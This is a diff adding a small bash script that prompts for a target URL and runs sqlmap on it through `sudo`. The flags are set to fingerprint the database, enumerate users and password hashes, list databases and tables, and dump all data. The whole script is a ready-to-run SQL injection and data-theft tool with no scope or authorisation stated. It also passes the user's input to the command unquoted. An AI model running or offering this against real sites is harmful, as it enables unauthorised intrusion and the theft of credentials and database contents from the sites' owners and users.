@@ -1,0 +1,10 @@
+#!/bin/bash
+
+echo -n "SQLMAP: ~$ "
+read text
+echo "Proforming SQL Injection On.. $text"
+
+sudo sqlmap -u $text -g --stacked-test -f -b --current-user --current-db --users --passwords --dbs --tables --dump-all
+echo "Executing SQLmap On: $text"
+
+
